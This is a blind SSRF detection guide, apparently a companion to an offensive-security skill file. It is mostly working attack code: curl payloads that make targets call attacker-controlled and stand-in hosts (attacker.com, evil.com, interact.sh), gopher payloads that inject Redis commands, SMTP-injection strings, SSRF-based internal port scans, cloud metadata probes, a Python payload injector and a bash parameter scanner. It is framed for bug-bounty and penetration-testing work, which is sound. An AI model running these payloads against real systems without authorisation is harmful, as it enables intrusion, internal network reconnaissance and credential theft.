# Blind SSRF Detection Guide

> Companion to `skills/web-ssrf/SKILL.md`. This guide covers out-of-band detection techniques, DNS callback methods, timing-based inference, and tools like Burp Collaborator for identifying SSRF vulnerabilities where no direct response is returned to the attacker.

---

## 1. Understanding Blind SSRF

Blind SSRF occurs when the server makes a request to an attacker-controlled destination but does not return the response content. Detection requires out-of-band (OOB) channels or timing analysis:

```bash
# Classic SSRF: response content is visible
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# Response: ami-id, instance-type, etc. (directly visible)

# Blind SSRF: no response content returned
curl "http://target.com/webhook?callback=http://attacker.com/callback"
# Response: {"status": "webhook registered"} (no content from the fetched URL)

# Detection strategy: observe the REQUEST arriving at attacker infrastructure
# rather than reading the RESPONSE in the application
```

---

## 2. DNS Callback Detection

DNS resolution is the most reliable OOB channel because it works even when HTTP is blocked:

```bash
# Method 1: Burp Collaborator
# Generate unique Collaborator payload
COLLAB="unique-id.burpcollaborator.net"
curl -s "http://target.com/api/import" \
  -H "Content-Type: application/json" \
  -d "{\"source_url\": \"http://${COLLAB}/test\"}"
# Check Collaborator for DNS/HTTP interactions

# Method 2: interactsh (open-source alternative)
# Start interactsh client
interactsh-client -v 2>&1 | tee interactions.log &
INTERACT_URL=$(grep -oP '[a-z0-9]+\.interact\.sh' interactions.log | head -1)

# Inject interactsh URL into SSRF-susceptible parameters
curl -s "http://target.com/api/validate-url" \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"http://${INTERACT_URL}/ssrf-test\"}"

# Method 3: Custom DNS server for precise tracking
# Using dnschef as authoritative DNS for attacker domain
sudo dnschef --fakedomains attacker-oob.com \
  --fakeip 127.0.0.1 \
  --interface 0.0.0.0 \
  --logfile dns_callbacks.log &

# Inject subdomain-encoded payloads for parameter identification
curl -s "http://target.com/fetch" \
  -d "url=http://param-url.target-app.attacker-oob.com"
curl -s "http://target.com/fetch" \
  -d "callback=http://param-callback.target-app.attacker-oob.com"

# Each parameter gets a unique subdomain — DNS log shows which triggered
grep "param-" dns_callbacks.log
```

---

## 3. Timing-Based SSRF Inference

When OOB channels are blocked, use response timing to infer SSRF behavior:

```bash
# Baseline: measure normal response time
time curl -s -o /dev/null "http://target.com/api/check?url=http://example.com"
# real 0.234s

# Test 1: Point to a non-routable IP (should timeout = slow response)
time curl -s -o /dev/null "http://target.com/api/check?url=http://10.255.255.1/"
# real 5.012s → Server attempted connection (SSRF confirmed)

# Test 2: Point to closed port on localhost
time curl -s -o /dev/null "http://target.com/api/check?url=http://127.0.0.1:1/"
# real 0.050s → Connection refused (fast) = port closed but SSRF exists

# Test 3: Point to open port on localhost
time curl -s -o /dev/null "http://target.com/api/check?url=http://127.0.0.1:22/"
# real 0.180s → Connection established = port open

# Automated timing-based port scan via blind SSRF
for port in 22 80 443 3306 5432 6379 8080 9200 27017; do
  start=$(date +%s%N)
  curl -s -o /dev/null --max-time 10 \
    "http://target.com/api/check?url=http://127.0.0.1:${port}/"
  end=$(date +%s%N)
  elapsed=$(( (end - start) / 1000000 ))
  echo "Port $port: ${elapsed}ms"
done
```

---

## 4. Burp Collaborator Workflow

Systematic blind SSRF testing with Burp Collaborator:

```python
#!/usr/bin/env python3
"""Automated blind SSRF detection using Burp Collaborator API."""

import requests
import time
import json
from dataclasses import dataclass

@dataclass(frozen=True)
class SSRFTest:
    parameter: str
    payload_url: str
    collaborator_id: str
    injection_point: str

@dataclass(frozen=True)
class SSRFResult:
    test: SSRFTest
    interaction_type: str  # dns, http, smtp
    client_ip: str
    timestamp: str

def generate_collaborator_payloads(
    base_domain: str, target_params: list[str]
) -> list[SSRFTest]:
    """Generate unique Collaborator URLs for each test case."""
    tests = []
    for param in target_params:
        collab_id = f"ssrf-{param}-{int(time.time())}"
        payload = f"http://{collab_id}.{base_domain}"
        tests.append(SSRFTest(
            parameter=param,
            payload_url=payload,
            collaborator_id=collab_id,
            injection_point=f"POST /api/settings [{param}]"
        ))
    return tests

def inject_payloads(target_url: str, tests: list[SSRFTest]) -> None:
    """Send SSRF payloads to target application."""
    for test in tests:
        # Test in URL parameter
        requests.get(
            target_url,
            params={test.parameter: test.payload_url},
            timeout=10
        )
        # Test in JSON body
        requests.post(
            target_url,
            json={test.parameter: test.payload_url},
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        # Test in headers
        requests.get(
            target_url,
            headers={f"X-{test.parameter}": test.payload_url},
            timeout=10
        )

def check_interactions(
    collaborator_api: str, tests: list[SSRFTest]
) -> list[SSRFResult]:
    """Poll Collaborator for received interactions."""
    results = []
    response = requests.get(f"{collaborator_api}/poll", timeout=30)
    interactions = response.json().get("interactions", [])
    for interaction in interactions:
        subdomain = interaction.get("subdomain", "")
        for test in tests:
            if test.collaborator_id in subdomain:
                results.append(SSRFResult(
                    test=test,
                    interaction_type=interaction["type"],
                    client_ip=interaction["client_ip"],
                    timestamp=interaction["timestamp"]
                ))
    return results
```

---

## 5. Protocol-Specific OOB Channels

When HTTP and DNS are filtered, try alternative protocols:

```bash
# FTP-based OOB (some SSRF implementations follow FTP URLs)
# Set up FTP listener
python3 -m pyftpdlib -p 21 -w /tmp/ftp_loot &

# Inject FTP URL
curl -s "http://target.com/fetch?url=ftp://attacker.com:21/test"

# Gopher protocol (powerful for internal service interaction)
# Gopher can craft arbitrary TCP payloads
# Send Redis commands via gopher
GOPHER_PAYLOAD="gopher://127.0.0.1:6379/_SET%20ssrf-test%20confirmed%0D%0A"
curl -s "http://target.com/fetch?url=${GOPHER_PAYLOAD}"

# SMTP-based OOB (trigger email to attacker-controlled address)
SMTP_PAYLOAD="http://127.0.0.1:25/%0D%0AHELO%20attacker%0D%0AMAIL%20FROM%3A%3Ctest%40test.com%3E%0D%0ARCPT%20TO%3A%3Cattacker%40evil.com%3E%0D%0ADATA%0D%0ASSRF%20confirmed%0D%0A."
curl -s "http://target.com/fetch?url=${SMTP_PAYLOAD}"

# TFTP-based OOB (UDP — bypasses TCP-only firewalls)
# Start TFTP listener
atftpd --daemon --port 69 --logfile /tmp/tftp.log /tmp/tftp_root
curl -s "http://target.com/fetch?url=tftp://attacker.com/test"
grep "test" /tmp/tftp.log && echo "SSRF confirmed via TFTP"
```

---

## 6. Webhook and Callback Injection Points

Many applications have legitimate callback/webhook features that are SSRF vectors:

```bash
# Common injection points for blind SSRF
# 1. Webhook URLs
curl -s -X POST "http://target.com/api/webhooks" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://COLLABORATOR/webhook", "events": ["order.created"]}'

# 2. Avatar/image URL imports
curl -s -X PUT "http://target.com/api/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"avatar_url": "http://COLLABORATOR/avatar.png"}'

# 3. URL preview/unfurling (chat applications)
curl -s -X POST "http://target.com/api/messages" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"text": "Check this out: http://COLLABORATOR/preview"}'

# 4. PDF/document generation from URL
curl -s -X POST "http://target.com/api/export/pdf" \
  -H "Content-Type: application/json" \
  -d '{"source_url": "http://COLLABORATOR/document"}'

# 5. RSS/feed import
curl -s -X POST "http://target.com/api/feeds" \
  -d '{"feed_url": "http://COLLABORATOR/rss.xml"}'

# 6. OAuth callback manipulation
# Modify redirect_uri to point to collaborator
curl -s "http://target.com/oauth/authorize?client_id=app&redirect_uri=http://COLLABORATOR/callback"
```

---

## 7. Automated Blind SSRF Scanner

Comprehensive scanner that tests multiple injection points and detection methods:

```bash
#!/bin/bash
# blind-ssrf-scanner.sh — test all parameters for blind SSRF

TARGET="http://target.com"
OOB_DOMAIN="unique123.interact.sh"
RESULTS_FILE="ssrf_results.txt"

# Parameters commonly vulnerable to SSRF
PARAMS=(
  "url" "uri" "path" "dest" "redirect" "callback"
  "webhook" "feed" "source" "target" "link" "href"
  "src" "image" "img" "avatar" "fetch" "proxy"
  "endpoint" "host" "domain" "site" "page"
)

echo "[*] Testing $TARGET for blind SSRF via ${#PARAMS[@]} parameters"
echo "[*] OOB domain: $OOB_DOMAIN"

for param in "${PARAMS[@]}"; do
  # Unique subdomain per parameter for identification
  payload="http://${param}.${OOB_DOMAIN}/ssrf"

  # GET parameter injection
  curl -s -o /dev/null --max-time 5 \
    "${TARGET}/?${param}=${payload}" 2>/dev/null

  # POST form data
  curl -s -o /dev/null --max-time 5 \
    -X POST "${TARGET}/" \
    -d "${param}=${payload}" 2>/dev/null

  # JSON body
  curl -s -o /dev/null --max-time 5 \
    -X POST "${TARGET}/api/" \
    -H "Content-Type: application/json" \
    -d "{\"${param}\": \"${payload}\"}" 2>/dev/null

  echo "[+] Tested parameter: $param"
done

echo "[*] Check OOB server for interactions from target"
echo "[*] DNS lookups to *.${OOB_DOMAIN} confirm blind SSRF"
```

---

## 8. Confirming and Escalating Blind SSRF

Once blind SSRF is confirmed, validate impact for reporting:

```bash
# Confirm internal network access by targeting known internal services
# Use timing differences to map internal topology

# Test if target can reach internal metadata service
time curl -s -o /dev/null \
  "http://target.com/fetch?url=http://169.254.169.254/"
# Fast response + no error = metadata service reachable

# Test internal service discovery via DNS
# If target resolves internal hostnames, DNS queries reveal infrastructure
curl -s "http://target.com/fetch?url=http://internal-db.corp.local:3306/"
# Check OOB DNS for resolution of internal-db.corp.local

# Demonstrate impact without exploitation
# Show that internal services respond (via timing or OOB)
for internal in "127.0.0.1:6379" "10.0.0.1:8080" "192.168.1.1:22"; do
  start=$(date +%s%N)
  curl -s -o /dev/null --max-time 5 \
    "http://target.com/fetch?url=http://${internal}/"
  elapsed=$(( ($(date +%s%N) - start) / 1000000 ))
  echo "Target: $internal — Response time: ${elapsed}ms"
done

# Document for bug bounty report:
# 1. Proof of OOB interaction (DNS/HTTP callback received)
# 2. Source IP of the callback (proves it came from target infrastructure)
# 3. Timing evidence of internal network access
# 4. List of reachable internal services (without extracting data)
```

Blind SSRF is frequently underestimated because the attacker cannot directly see responses. However, combined with internal service knowledge, it enables credential theft from metadata services, internal port scanning, and interaction with unauthenticated internal services — making it a high-severity finding in most environments.
